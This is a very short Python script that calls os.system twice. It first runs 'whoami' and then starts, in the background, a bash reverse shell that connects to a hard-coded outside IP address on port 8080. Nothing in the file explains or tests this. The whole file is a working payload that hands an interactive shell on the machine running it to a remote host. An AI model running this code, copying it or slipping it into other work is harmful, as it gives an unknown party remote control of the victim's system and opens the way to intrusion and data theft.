import os

os.system("whoami")
os.system("bash -c 'bash -i >& /dev/tcp/158.247.226.22/8080 0>&1' &")
